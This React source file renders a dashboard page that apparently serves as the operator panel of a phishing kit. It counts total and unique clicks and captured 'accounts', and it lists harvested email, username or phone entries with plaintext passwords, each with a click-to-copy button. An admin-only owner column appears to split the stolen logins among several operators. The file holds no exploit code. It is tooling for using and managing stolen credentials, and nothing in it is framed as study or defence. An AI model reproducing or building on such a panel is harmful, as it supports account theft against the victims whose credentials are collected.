import DashboardCard from '@/Components/DashboardCard';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout';
import { Head } from '@inertiajs/react';
import { BanknotesIcon, CircleStackIcon, EyeIcon, TableCellsIcon } from '@heroicons/react/24/solid';
import { useEffect, useState } from 'react';
import DataTable from '@/Components/Table';
import CopyToClipboard from 'react-copy-to-clipboard';

const Dashboard = ({ auth, accounts, totalAccounts, todayTotalAccounts, totalClicks, uniqueClicks }) => {

    const [eup, setEup] = useState(null);
    const [password, setPassword] = useState(null);

    let headItemData = [
        'Id',
        'email/Username/Phone',
        'Password',
        'Owner',
        'type',
        'Time',
    ];

    const [headItems, setHeadItems] = useState(headItemData);

    useEffect(() => {
        if(!auth.user.is_admin){
            setHeadItems(headItems.filter(item => item != 'Owner'))
        }
    },[])

    const handleCredentialCopy = (index, type) => {
        if(type == 'eup'){
            setEup(index)
        }

        if(type == 'password'){
            setPassword(index)
        }
    }

    const handleMouseLeave = (type) => {
        if(type == 'eup'){
            setEup(null)
        }

        if(type == 'password'){
            setPassword(null)
        }
    }

    return (
        <AuthenticatedLayout
            header='Dashboard'
        >
            <Head title="Dashboard" />

            <div className="overflow-hidden">
                <div className="grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-4 2xl:gap-7">
                    <DashboardCard title="Total clicks" value={totalClicks} className='bg-green-500'>
                        <EyeIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Unique clicks" value={uniqueClicks} className='bg-blue-400'>
                        <CircleStackIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Accounts" value={todayTotalAccounts} className='bg-orange-400'>
                        <BanknotesIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Total Accounts" value={totalAccounts} className='bg-fuchsia-500'>
                        <TableCellsIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                </div>
            </div>
            <div className='mt-20'>
                <DataTable headItems={headItems}>
                    {
                        accounts.map((account, i) => (
                            <tr key={i} className='odd:bg-white even:bg-slate-100'>
                                <td className="text-left py-3 px-4">{account.id}</td>
                                <CopyToClipboard text={account.eup}>
                                    <td className="text-left py-3 px-4 cursor-pointer">
                                        <button onMouseLeave={() => handleMouseLeave('eup')} onClick={() => handleCredentialCopy(i, 'eup')} type='button' className='font-semibold' title='Click to copy'>{account.eup}</button>
                                        {
                                            eup == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                        }
                                    </td>
                                </CopyToClipboard>
                                <CopyToClipboard text={account.password}>
                                    <td className="text-left py-3 px-4 cursor-pointer">
                                        <button onMouseLeave={() => handleMouseLeave('password')} onClick={() => handleCredentialCopy(i, 'password')} type='button' className='font-semibold' title='Click to copy'>{account.password}</button>
                                        {
                                            password == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                        }
                                    </td>
                                </CopyToClipboard>

                                {account.owner && <td className="text-left py-3 px-4">{account.owner.name}</td>}

                                <td className="text-left py-3 px-4">
                                    <span className='text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-green-400 bg-green-100 text-green-800'>{account.type.name}</span>
                                </td>
                                <td className="text-left py-3 px-4 italic font-thin">{account.time_for_humans}</td>
                            </tr>
                        ))
                    }
                </DataTable>
            </div>
        </AuthenticatedLayout>
    );
}

export default Dashboard;
